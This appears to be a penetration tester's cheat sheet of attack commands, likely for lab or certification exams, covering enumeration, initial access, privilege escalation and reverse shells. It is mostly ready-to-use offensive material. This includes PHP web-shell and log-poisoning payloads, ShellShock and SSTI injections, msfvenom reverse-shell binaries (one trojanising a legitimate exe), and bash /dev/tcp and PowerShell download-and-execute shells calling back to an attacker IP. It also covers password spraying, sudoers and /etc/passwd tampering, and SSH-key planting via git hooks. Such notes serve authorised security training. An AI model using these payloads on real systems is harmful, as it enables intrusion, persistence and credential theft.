
### External Process enumeration with LFI
```bash
#to find out which process id is running on the targert port
# 1337 in this case
i=0; MYVAR=""; while [[ $MYVAR != *"1337"* ]]; do MYVAR=$(curl -s http://PATH/TO/LFI?PARA=/proc/$i/cmdline); echo $i; ((i=i+1)); done; 
```

### snmpwalk and snmpbulkwalk
```bash
# Check if any snmp extended object for code execution
snmpwalk -v X -c public ${IP} NET-SNMP-EXTEND-MIB::nsExtendOutputFull
# For the bulkwalk, may look for SWRun. 
snmpbulkwalk -Cr1000 -c public  -v 2c ${IP} . > snmpbulkwalk
```
> The SWRunName stands for the software binary name. And SWRunPath stands for where the binary from. The SWRunParameters shows the parameters passed into the binary, which potentially got some info exposed to us that we may abuse.


### SMBmap
```bash
# domain is optional, may put -u '' -p '' to confirm null session access
smbmap -H IP -d DOMAIN -u domain_user -p pass -H IP
# depth probably > 5 if you wanna traverse and search deep into a share
smbmap -H IP -R SHARES -A PATTEN --depth 6 -q
```


### Autorecon
```bash 
# This tool takes significant amount of time
# And require a lot of pre-configuration
# Strongly recommend getting familiar with the above manual tool b4 using this
# Use it with a list of IPs
autorecon -t hosts.txt -vv
```

### NFS mounting
| action    | command    |
| --- | --- |
| Show available directories | showmount -e ${IP} |
| mount | mount ${ip}:/vol/share /mnt/nfs |
| unmount | umount -f -l tmp |






### kerbrute
``` bash
# userenum
# --dc can also be dc ip
kerbrute userenum --dc DC_NAME -d DOMAIN_NAME USER.txt
# password spray
kerbrute passwordspray --dc DC_IP -d DOMAIN_NAME USERS.txt PW
```










### fuzzer tool
```bash
# GET req
wfuzz -u http://${IP}/path/index.php?param=FUZZ -w /usr/share/wordlists/rockyou.txt
# POST req
wfuzz -u http://${IP}/path/index.php?action=authenticate -d 'username=admin&password=FUZZ' -w /usr/share/wordlists/rockyou.txt
# Subdomain virtual host enumeration
ffuf -w /path/to/wordlist -u https://target  -H 'Host: FUZZ.TARGET.DOMAIN'
# Find log file for poisoning
cat /usr/share/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt | grep log > log.txt 
ffuf -u http://${IP}/LFI.php?file=FUZZ -w log.txt -fr "Failed opening" -o fuzz.txt 
```

## 2. Initial Access
This is the way of getting foothold as a low privileged user on the server.
### Public exploit
First thing you need to learn is locating public exploit and how to use it.
Most of the time you may find a public exploit in exploit-db (web version), searchsploit (cli version) or github. 
Using github exploit is just similar methodology,
but instead of using searchsploit cli tool,
you go to google search it.

Most of the time you obtained an application name and version,
you should go and see if public exploit available.
You will need to see if the version is vulnerable to something that may gain you access.

A word press plugin mail masta is being used as example. 
```bash
# search for relavant vulnerabilities
searchsploit wordpress mail masta
# From the search, we can see one txt and py file related to a LFI vuln
# We can view the content of exploit file without downloading it
searchsploit -x php/webapps/40290.txt
# Always try to automate the exploit so I will go for the py script
searchsploit -m php/webapps/50226.py
# The exploit won't work if you blindly copy and run
# Read the exploit script before execution.
# In this case a wordlist.txt is required, create the relavant file and run again
# When working on public exploit, there are several things that you may have to change
# 1. Port, the service may run on a non-default port, 
#    and the rev shell port maybe hardcoded
# 2. IP, the target ip and the rev shell ip used may be hardcoded
# 3. URL/URI, the web service may have a different path
#    In the example, if the wordpress is running under /wp, 
#    I will have to add /wp to my exploit script where appropriate.
# 4. Payload name, you may need to use a customised payload 
#    in the exploit script
```

### Common Web App vuln
If cannot locate a public exploit, you may need other means for getting the initial foothold.
### Arbitrary File Upload
If the site has a file upload function, and you know where is the 
upload directory (maybe in /uploads).

Locate your payload in /usr/share/webshells/, upload the corresponding script file.
Then navigate to http://IP/uploads/webshell.php. `webshell.php` is just an example, you need to navigate to the corresponding uploaded file.
If you are using payload like simple-backdoor.php, which does not do automatic payload execution and wait for user input
, you will need to navigate to http://IP/uploads/simple-backdoor.php then append `?cmd=PAYLOAD` or the payload will be received as post form data.
















### Insecure deserialization

* [jsonpickle](https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/)
* [python payload generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator)
* [All other langauges payload list](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)

### File Inclusion to RCE
The log poisoning is not necessary targeting php, it is just a common example being used.
You may need to either upload the web shell that need to be included or inject with other languages.
```bash
#POC LFI, check /etc/passwd
http://IP/?FI=/etc/passwd
#or
http://IP/?FI=../../../../../../../../etc/passwd
#if there is any user has shell login
http://IP/?FI=/home/user/.ssh/id_rsa
# more advanced filter see https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
# RFI, rare since it is not enabled by default
# Setup a http server contains a reverse shell script
# send request then it will be invoked
http://IP/?FI=http://YOUR_IP/YOUR_PAYLOAD
# access log poisoning with ssh
ssh '<?php system($_GET['cmd']); ?>'@IP 
# access log poisoning with http
nc -nv IP HTTP_PORT
<?php system($_GET['cmd']); ?> #<- then click on return key twice and you should see a bad request respond
# SMTP injection
http://IP/FI?=/var/mail/TARGET_USER&cmd=id
# extension append filter
# data, can execute code directly
http://IP/FI?=data://text/plain,<?php phpinfo(); ?>
http://IP/FI?=data://text/plain,<?php shell_exec("PAYLOAD"); ?>
# data and base64 encode to code execution
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
http://IP/FI?=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls
# base64, can check file source
http://IP/FI?=php://filter/convert.base64-encode/resource=FILE
```

#### SMTP code injection associate with LFI to RCE
```bash
#Connect to the smtp port with nc/telnet
EHLO who_you_are
VRFY TARGET_USER
mail from:you
rcpt to: TARGET_USER
data
Subject: WHATEVER
<?php echo system($_REQUEST['cmd']);?>
    #<- this extra newline is essential
.   #<- also this period is essential
```

#### LFI notes
* /proc/self/status can see the web server current run as which user and proc id etc
* /proc/self/environ see process environment variable, potential password stored in env
* /var/log/apache2/access.log is one example of log paths, may fuzz with these [lists](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders) to see which files are usable
* /var/mail/TARGET_USER, at the end of request add a &cmd to execute command
* if you have write access to the host, upload a file that the host, use LFI filter to check if the file uploaded correctly(path and extension), remove the base64 wrapper for execution
* [null byte termination](https://gabb4r.gitbook.io/oscp-notes/web-http/lfi-and-rfi/null-byte-injection) `%00` only works before php 5.3
* if none of these work, try to view config.php,db_connect.php and see if they left any creds

### webdav
```bash
davtest -url IP -sendbd auto
# see want can be sent and executed
# say if txt and html can be executed
# copy your web shell and name it as .txt
curl -X PUT http://IP/shell.txt --data-binary @shell.txt 
curl -X MOVE -H "Destination:http://IP/shell.aspx" http://IP/shell.txt
```

### tomcat 
```bash
# use the enumerated login for manager portal
# create payload, add EXITFUNC=thread if target is Windows
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war -o rev.war
# go to manager panel -> war file to deploy
# click on the deployed war url for invoking reverse shell
```

### ShellShock

```bash
curl -A "() { :; }; PAYLOAD" http://IP/cgi-bin/cgi-script 
 
curl -H "User-Agent: () { :; }; PAYLOAD" http://IP/cgi-bin/cgi-script
```

### drupal
``` bash
droopescan scan -u IP
# initial shell(limited function) 
# https://github.com/dreadlocked/Drupalgeddon2 
# only command execution 
# https://github.com/Jack-Barradell/exploits/blob/master/CVE-2018-7600/cve-2018-7600-drupal7.py
```

### James Admin Server initial foothold & POP3
```bash
# If you find something on port 4555 and also running POP3
# try login to port 4555 via telnet with root:root
# if you successfully login, run
listusers
# reset all the password
setpassword USER 123
#Then connect to port 110 POP3, login all user account to read the mail
USER USER
PASS 123
LIST
RETR 1
```

### Wordpress non public exploit
* if able to login to the admin panel
  * go to apperance and select 404.php, replace content with reverse shell payload, setup listener, go to nonexisting page
  * [plugin shell upload](https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell)

### prtg
* [Python2 exploit](https://github.com/wildkindcc/CVE-2018-9276/blob/master/CVE-2018-9276.py )
* [Python3  exploit](https://github.com/A1vinSmith/CVE-2018-9276/blob/main/exploit.py )

### nibbleblog
* [Shell upload script](https://github.com/dix0nym/CVE-2015-6967)
```
python nibble.py --url URL --username USER --password  PASS -x PAYLOAD
```

### post form login bypass with type juggling
* if server using php post form login,
may check php type juggling
just add a `[]` between `password` and `=`

### code injection with phpliteadmin
* create a new database with name anything.php
* create new table name as shell with number of field 1
* 1 variable be name shell, type TEXT and default value <?php system($_GET[cmd])?> 
* trigger it with LFI, the file probably in /var/tmp/anything.php
* use with &cmd=command

### wekzeug console pin exploit
[Exploit guide](https://www.daehee.com/werkzeug-console-pin-exploit/)
``` bash
# copy the exploit script and fill in all public and private bits
# getattr(mod, '__file__', None) is the absolute path of an app.py in the flask directory(see traceback)
# mac address = /sys/class/net/eth0/address
echo MAC | tr -d ":" #get the correct format
python -c 'print(0xFORMMATED_STRING)'#get the decimal value of the address
# For machine_id, check either
/etc/machine-id
/proc/sys/kernel/random/boot_id
# cgroup value
/proc/self/cgroup
#append the cgroup id to machine id
#then run the script to get PIN
#might have to change the hash type if the created PIN is incorrect
```

### SSRF to LFI
[SSRF to LFI](http://hassankhanyusufzai.com/SSRF-to-LFI/)
```bash
# Payload to check if the app vulnerable to SSRF
http://localhost:HTTP_PORT
# If it has a valid respond
file:///etc/passwd
```

### XXE
[detail guide](https://portswigger.net/web-security/xxe)

Example paylaod
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

### Python SSTI
```python
{% import os %}{{os.system('PAYLOAD')}} 
```

### Binary payload injection(msfvenom)
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXIT_FUNC=thread -f exe -e x86/shikata_ga_nai -i 9 -x VALID_BINARY -o bad_binary.exe
```
## Non web vuln
Some services may have vulnerabilities that allow you to gain shell access.

### from xp_cmdshell to shell (may see in AD env)
```bash
# If you are doing it against a host in different subnet, set up the proxy then execute with proxychians
sqsh -S IP -U DOMAIN_OR_HOST_NAME\\USER -P PASS
exec sp_configure ‘show advanced options’, 1;
reconfigure;
exec sp_configure ‘xp_cmdshell’, 1;
reconfigure;
\go
xp_cmdshell 'PAYLOAD';
\go
```

#### Eternal Blue
``` bash
#https://github.com/helviojunior/MS17-010
#Generate payload in exe format and use the send_and_execute.py
msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=IP LPORT=PORT -f exe -o payload.exe
python2 /opt/MS17-010/send_and_execute.py TARGET_IP payload.exe
# If this does not work, use the paylaod created by the following commands
msfvenom -p windows/x64/shell_reverse_tcp -a x64 LHOST=IP LPORT=443 -f raw -o sc_x64_payload.bin
nasm -f bin eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin
cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin
```

































### Cron job abuse/general priv esc techniques
``` bash
# For cron job, there are many things you can use as a payload
# Modify or create the script
#1. Add sticky bit to the bash file
chmod u+s /bin/bash
#or 
cp /bin/bash /tmp/bash; chmod u+s /tmp/bash
2. Add sudoers
echo "CURRENT_USER ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 
#3. Call reverse shell
#add reverse shell payload to the script
#4. add new privileged user to /etc/passwd
#Create a new user password with openssl
openssl passwd 123
#append the new user to /etc/passwd in such format 
echo "Fakeuser:${HASH}:0:0:root:/root:/bin/bash" >> /etc/passwd
# if there is a $ in the hash, you might have to escape it with \
```
### Modifiable service script exploit
If a service script (.service file or the script used in `ExecStart`) is writable,
you can replace the `ExecStart` part with your PE payload.
Or replace the content of the script which called by the `ExecStart`.
The payload and methodology can be any of the general priv esc tehcniques

### Library Hijack
[Python lib hijack](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/)

Just add the reverse shell python code at the end of the writable library py file


### fail2ban
```bash
# https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49
# modify /etc/fail2ban/action.d/iptables-multiport.conf
# replace the actionban = PAYLOAD #could be anything as long as it helps you PE(reverse shell, suid...)
# could use a script to help you
#!/bin/bash
cp ./iptables-multiport.conf.bak ./iptables-multiport.conf
mv ./iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf
sudo /etc/init.d/fail2ban restart
```

### webmin
if you have webmin admin panel login, go into the admin panel
create a new user with any username but User ID 0 & group id 0

### git commit exploit
```
# edit .git/hooks/pre-commit
# Or may use a rev shell command
#!/bin/sh
mkdir -p /home/user/.ssh
print "\n${SSH_PUBLIC_KEY}" >> /home/user/.ssh/authorized_keys
chmod 600 /home/user/.ssh/authorized_keys
```
Then add a file
```
git --work-tree /etc add /etc/passwd
```
Then commit to exploit

### Modifiable service binary & Unquoted Path service
```bash
# Run SharpUp.exe to find if any service binary is writable or any unquoted path service
# If found anything, run msfvenom to create a service binary
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=KALI_PORT EXIT_FUNC=thread -f exe-service -o SERVICE_NAME.exe
```
Transfer the exploit binary to the windows target
```powershell
# For writable binary service
copy SERVICE_NAME.exe C:\PATH\TO\ORIGINAL\SERVICE\BINARY.exe
# For unquoted path, let say the service binary is in 
# C:\Program Files\A Subfolder\B Subfolder\C Subfolder
# while we can write to "A subfolder" directory
copy SERVICE_NAME.exe "C:\Program Files\A Subfolder\B.exe"
# Restart service
sc.exe stop SERVICE_NAME
sc.exe start SERVICE_NAME
```

### tar wildcard exploit
If the cron script or the sudo rule allowed something be like
```
tar cf FIXED_TAR_NAME *
```
Create a script with following content
```
#!/bin/bash
cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash
```
Then create some more files in the script's directory
```
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```
Then when running the script, it will be interpreted as
```
tar cf FIXED_TAR_NAME --checkpoint=1 --checkpoint=action=exec=sh shell.sh
```
Go to /tmp will find a suid set bash






### local hash dump
If SAM file and SYSTEM file are available without getting admin access, use impacket-secretsdump
```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```
Then save the admin hash to a file and  crack the admin hash with hashcat
```bash
hashcat -m 1000 admin.hash /usr/share/wordlists/rockyou.txt
```

### PE with service all access
```powershell
sc qc SERVICE
sc config SERVICE binPath= "cmd.exe /c powershell.exe -enc BASE64_PAYLOAD"
```

### Windows SEImpersonate privilege exploit
[Juicy Potato](https://github.com/ohpe/juicy-potato)

[God Potato](https://github.com/BeichenDream/GodPotato)

[Sweet Potato](https://github.com/uknowsec/SweetPotato/blob/master/README.md)
```
# Juicy Potato
# remember to specify /c since we are passing in arguments to cmd.exe
juicy.exe  -l 12345 -p C:\Windows\system32\cmd.exe -a "/c c:\windows\Temp\nc.exe -e cmd.exe KALI_IP 4443" -t * -c "CLSID" 
#call a ps session
\juicy.exe  -l 12345 -p C:\Windows\system32\cmd.exe -a "/c powershell -ep bypass IEX(New-Object Net.WebClient).downloadString('http://KALI_IP/rev.ps1')" -c "CLSID"
#god potato
.\potato.exe -cmd "cmd /c powershell -ep bypass IEX(New-Object Net.WebClient).downloadString('http://KALI_IP/rev.ps1')"
#sweet potato
.\potato.exe -a "powershell.exe -ep bypass IEX(New-Object Net.WebClient).downloadString('http://KALI_IP/rev.ps1')"
```

### CVE 2021-3034 PwnKit exploit
[Python 3](https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py )

[Python 2](https://gist.github.com/Ayoub-2/9f52583daec92ba2d81b4c4b4cbfe902)  

[C/sh](https://github.com/ly4k/PwnKit )

### CVE 2021-3560 polkit exploit

[python3](https://github.com/Almorabea/Polkit-exploit)

[sh](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation)  














sometimes the website is vulnerable to RCE
but the execution output does not show up on the web page.
We need a way to proof that the RCE is successful to continue on the exploit.
There are multiple ways to do so:

1. If you don't have access to machine (most of the scenario):

    You can PoC with two ways
    
    The first way is setup a nc listener at port 80
    then put your payload as:
    ```bash
    curl/wget YOUR_IP
    ```
    A valid respond should come in:
    ```bash
    # nc -lvnp 80
    listening on [any] 80 ...
    connect to [YOUR_IP] from (UNKNOWN) [TARGET_IP] 50558
    GET / HTTP/1.1
    Host: YOUR_IP
    User-Agent: curl/7.88.1
    Accept: */*
    ```

    Second way is setup a tcpdump listen on whichever 
    network interface you are connected to your target,
    capture only icmp packets
    and put your payload as
    ```
    ping YOUR_IP -c 1
    ```
    A valid respond should look like:
    ```
    # tcpdump -i tun0 icmp
    tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
    listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
    08:55:30.741476 IP TARGET_IP > YOUR_IP: ICMP echo request, id 1, seq 1, length 64
    08:55:30.741652 IP YOUR_IP > TARGET_IP: ICMP echo reply, id 1, seq 1, length 64
    ```

2. You have access to host already, 
    but you need to priv esc as someone else via an internal running application
    
    Except the above PoC technique, you can use the following payload:
    ```
    echo "pwn3d" > /tmp/pwn
    ```
    A valid respond should be a new file is created at /tmp named pwn. 
    Also check the file permission and ownership with `ls -la` to see if 
    the file is owned the by process owner

### Execute reverse shell payload alternative
If you can't execute the reverse shell payload directly 
(maybe some sort of fiilters or firewall rules exist and preventing command injection payload),
try saving you payload into a script file and serving your payload through a http server. 
An example payload `rev.sh` will be like
```
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
```
Then on the server side, use `curl http://IP/rev.sh | bash` 
or similar tool as your injection payload.

### Command injection payload with firewall evasion
Sometimes an application might have firewall or defences in-place as a filter,
it means some special characters might be blocked.
Common command injection special characters are `;"|'&$`

If you found that an application consist of a firewall/defence,
try and see which characters are banned and which are not.
Sometimes it allows `'` but not `"`, vice versa.
Sometimes it allows `;` but not `|`, vice versa.

To test the banned characters, you can try changing the `'` in your 
original payload to `"` and see if it can get through the filter.
This can also apply to all special characters.
Let's say if `;` is blocked, then you may try `|`, `||`, `&&`, etc.

### Starting a windows conptyshell in background (can use it via a web shell to call conptyshell directly)
```cmd
start /B powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('http://KALI_IP/rev.ps1')"
```

### upgrade linux simple shell to tty shell without python
```bash
script -qc /bin/bash /dev/null 
```

### Python script to create a reverse shell payload
```python
import sys
import base64

payload = 'YOUR_PAYLOAD'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

### Linux ELF binary
```bash
# 32 bit
msfvenom -p linux/x86/shell_reverse_tcp LHOST=KALI_IP LPORT=NC_PORT -f elf -o shell.elf
# 64 bit
msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=NC_PORT -f elf -o shell.elf
```

### Windows EXE binary
```bash
#32 Bit
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=NC_PORT EXIT_FUNC=thread -f exe -o shell32.exe
#64Bit
msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=NC_PORT EXIT_FUNC=thread -f exe -o shell64.exe
```
### Windows Service
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=NC_PORT EXITFUNC=thread -f exe-service -o service.exe
```
### ASP
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=NC_PORT -f asp -o shell.asp
```
### JSP
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=KALI_IP LPORT=NC_PORT -f raw -o shell.jsp
```
### WAR (usually useful for tomcat)
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=KALI_IP LPORT=NC_PORT -f war -o shell.war
```
### Inject payload into an existing exe file
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=NC_PORT -x Legit.exe -f exe -o malicious.exe
```

### Decode base64 string in windows (sometime may need it due to special character)
```powershell
$base64String = 'BASE64_STRING'
$bytes = [System.Convert]::FromBase64String($base64String)
$text = [System.Text.Encoding]::UTF8.GetString($bytes)
Write-Output $text
```



### Useful Reverse shell payload 
[Windows Powershell](https://github.com/samratashok/nishang/tree/master/Shells)

[Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)


